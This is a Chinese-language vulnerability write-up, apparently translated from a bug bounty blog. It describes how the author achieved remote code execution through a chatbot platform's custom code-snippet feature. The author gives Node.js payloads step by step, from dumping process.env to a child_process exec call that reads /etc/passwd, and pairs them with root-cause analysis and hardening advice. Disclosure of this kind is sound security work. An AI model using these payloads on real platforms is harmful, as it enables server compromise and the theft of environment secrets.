#  如何发现AI chatbot 中的RCE   
原创 漏洞集萃  漏洞集萃   2025-04-14 22:59  
  
###   
#### 引言  
  
近年来，AI聊天机器人凭借其高效的客户服务、增强的用户互动以及简化的业务运营，迅速在各行各业中流行起来。这些智能系统依托复杂的算法和自然语言处理技术，与用户实现无缝交互。然而，与所有软件一样，它们也无法完全免疫安全漏洞的威胁。  
  
### 背景故事：发现的起点  
  
目标平台是一个功能强大的业务管理平台，集成了团队管理、邮件管理和聊天机器人等多种功能。在探索其聊天机器人自动化功能时，一个名为“从零开始（Start from Scratch）”的选项引起了我的注意。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwlZbqIvE9siaMHWsWdp0L8MQbCssSzt6rSDicdHthUianBOF8qO3SqftKQ/640?wx_fmt=other&from=appmsg "")  
  
“从零开始”提供了一系列定制化选项，包括工作流、Webhooks以及自定义代码片段等。这些功能为开发者提供了极大的灵活性，但也让我嗅到了一丝潜在的安全隐患。尤其是“运行代码片段（Run a Code Snippet）”这一选项，看起来像是一个可以深入挖掘的突破口。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwlDZKwdJcQbcWBd8tM4btsWOxib0xxpEqibJ121275k5cGEXIApiaUQNoQ/640?wx_fmt=other&from=appmsg "")  
### 技术细节：逐步逼近漏洞  
#### 第一步：探查代码片段功能  
  
“运行代码片段”允许开发者编写自定义代码，以生成聊天机器人的特定响应。默认代码片段如下：  
```
ounter(lineounter(lineounter(lineounter(line
const responseJson = {
  botMessage: "Hello world",
  responseExpected: false,
};
```  
  
这个平台基于**Node.js 18.x**  
框架构建，这让我联想到Node.js环境中一些可能被滥用的全局变量和函数。于是，我开始尝试在botMessage  
字段中插入一些简单的测试代码，例如Node.js的全局变量__dirname  
和__filename  
，以及简单的eval()  
表达式。  
##### 测试全局变量  
  
我首先尝试了以下代码：  
```
ounter(lineounter(lineounter(lineounter(line
const responseJson = {
  botMessage: __dirname,
  responseExpected: false,
};
```  
  
令人惊讶的是，聊天机器人返回了/var/task  
作为输出。这表明__dirname  
在系统内部被成功解析并执行，暗示代码片段的运行环境可能未被严格限制。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQw380EgnppkLGRibcc1jy3MJmzicpzt1DeZcG4iaHSeicicbcdLqkmXw0fV5w/640?wx_fmt=other&from=appmsg "")  
  
接着，我继续测试__filename  
：  
```
ounter(lineounter(lineounter(lineounter(line
const responseJson = {
  botMessage: __filename,
  responseExpected: false,
};
```  
  
结果返回了/var/task/Template.js  
，进一步确认全局变量可以被直接访问。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQw1BxJNYnR6yN7lfen3wu6HqGWfcVnlz6bjVM40SrzWXkPyQ92iaOmzPQ/640?wx_fmt=other&from=appmsg "")  
##### 测试动态执行  
  
为了探索代码执行的边界，我尝试了一个简单的eval()  
表达式：  
```
ounter(lineounter(lineounter(lineounter(line
const responseJson = {
  botMessage: eval(7 * 7),
  responseExpected: false,
};
```  
  
输出为49  
，表明eval()  
函数也可以正常运行。虽然这些结果已经显示出潜在的安全问题，但距离真正的RCE还差一步。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQw7nwt7TOAy1umtXXniaOiahCZMZa4iaZ5qNiaKB2qD6OUosU8Wm6mcgx0uQ/640?wx_fmt=other&from=appmsg "")  
#### 漏洞成因分析：为何会发生？  
  
这一阶段的测试表明，聊天机器人平台的代码执行环境存在以下问题：  
1. **缺乏沙箱隔离**  
：自定义代码片段直接在Node.js环境中运行，未通过沙箱机制隔离。这使得开发者可以访问Node.js的全局对象（如__dirname  
、__filename  
）和危险函数（如eval()  
）。  
  
1. **未过滤输入**  
：用户提供的代码片段未经过严格的输入验证或过滤，允许执行任意JavaScript代码。  
  
1. **权限控制不足**  
：代码运行环境可能具有较高的系统权限，访问敏感资源（如文件系统或环境变量）未受限制。  
  
这些问题共同为后续的RCE攻击铺平了道路。  
#### 科普小章节：Node.js全局对象与危险函数  
  
为了更好地理解漏洞成因，我们来简单介绍几个涉及的Node.js特性：  
##### 1. __dirname 和 __filename  
- **作用**  
：__dirname  
返回当前模块所在目录的绝对路径，__filename  
返回当前模块文件的绝对路径。  
  
- **潜在风险**  
：泄露服务器文件系统结构，可能为进一步攻击提供线索。  
  
- **安全建议**  
：在用户可控环境中，应屏蔽对这些全局变量的访问。  
  
##### 2. eval() 函数  
- **作用**  
：动态执行字符串形式的JavaScript代码。  
  
- **潜在风险**  
：允许执行任意代码，若用户输入未过滤，可能导致严重的安全问题，如RCE。  
  
- **安全建议**  
：避免在用户可控场景中使用eval()  
，或使用安全的替代方案（如JSON.parse  
）。  
  
##### 3. process 对象  
- **作用**  
：process  
是Node.js的全局对象，提供运行时环境信息，如环境变量（process.env  
）、平台信息（process.platform  
）等。  
  
- **潜在风险**  
：泄露敏感信息（如AWS密钥）或允许执行系统级操作。  
  
- **安全建议**  
：限制process  
对象的访问，特别是在用户可控代码中。  
  
#### 第二步：挖掘更深层次的访问  
  
在确认全局变量和eval()  
可用的基础上，我查阅了Node.js官方文档(  
https://nodejs.org/api/globals.html)，发现了一些更敏感的全局对象，例如：  
- process.env  
：存储环境变量，可能包含AWS密钥等敏感信息。  
  
- process.platform  
：返回运行平台信息。  
  
- process.execPath  
：返回Node.js可执行文件的路径。  
  
- process.memoryUsage()  
：返回进程的内存使用情况。  
  
我逐一测试了这些对象。例如：  
```
ounter(lineounter(lineounter(lineounter(line
const responseJson = {
  botMessage: process.env,
  responseExpected: false,
};
```  
  
结果返回了完整的环境变量列表，虽然未发现AWS密钥，但暴露了大量系统信息。类似地，process.platform  
返回了linux  
，而process.execPath  
返回了Node.js二进制文件的路径。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwuQekiawBY5oianmbgGBMyvoSHnhcSiblccl2728yEGI60kiaUWIUkRek2w/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwAvG7qiaRSh8icXNW2K9gNdIQMc2QjV20lLkO5x3IL5uZz2Yg5lL3GmXg/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwQdndanpoZhLIOBLP8UMNKNVUxqfaGeArJ1EtaBCkPgicX63fGySLWew/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwD724tlMNicbEkXfpClhAMUMmibRm0XHFrCqFX7hmAcqGmR2U2YTuxN7w/640?wx_fmt=other&from=appmsg "")  
  
这些结果表明，代码执行环境的权限远超预期，为实现完整的RCE提供了可能性。  
#### 最终突破：实现完整RCE  
  
在多次尝试和与同行的讨论后，我构造了以下payload，利用Node.js的child_process  
模块执行系统命令：  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
const { exec } = require('child_process');

exports.main = (event, callback) => {
  exec('head /etc/passwd', (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
      return;
    }

    const responseJson = {
      botMessage: stdout,
      responseExpected: false
    };

    callback(responseJson);
  });
};
```  
  
执行后，聊天机器人返回了/etc/passwd  
文件的内容，证明我成功读取了本地文件。进一步测试命令id  
，返回了当前用户的身份信息，确认了完整的RCE能力。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwnXeTCs1PiawjsRIkDcLBE4dibJOibjqHqXRUPiaia4wOwYNkELC5iciaIb1AQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOKl63AWyia3lO7TnvU1ia9zQwodJmtWXHsowrsibicK0jstnKtsQ8PC93d90aFRx4J4kpSEyNmCvFMYbw/640?wx_fmt=other&from=appmsg "")  
#### 漏洞成因分析：RCE的根源  
  
完整的RCE源于以下关键问题：  
1. **无限制的模块访问**  
：代码片段运行时可以直接引入child_process  
模块，允许执行系统命令。  
  
1. **高权限运行环境**  
：代码运行在具有文件系统访问权限的环境中，未对敏感操作进行限制。  
  
1. **回调机制的滥用**  
：平台允许用户定义回调函数，未对回调内容进行充分检查。  
  
#### Node.js中的child_process  
- **作用**  
：child_process  
模块允许Node.js程序创建子进程，执行系统命令或脚本。  
  
- **常见方法**  
：  
  
- exec()  
：执行shell命令，返回缓冲的输出。  
  
- spawn()  
：创建流式子进程，适合处理大量数据。  
  
- **潜在风险**  
：若用户可控代码能调用child_process  
，可能执行任意系统命令，导致RCE。  
  
- **安全建议**  
：在用户可控环境中禁用child_process  
，或使用沙箱隔离代码执行。  
  
###   
  
想获取更多真实漏洞案例与分析？  
  
欢迎关注公众号，一起用技术守护信任。  
  
  
  
====本文结束====  
  
以上内容由漏洞集萃翻译整理。  
  
参考：  
  
https://bugbountydirectory.com/blogs/unveiling-remote-code-execution-in-ai-chatbot-workflows/  
  
  
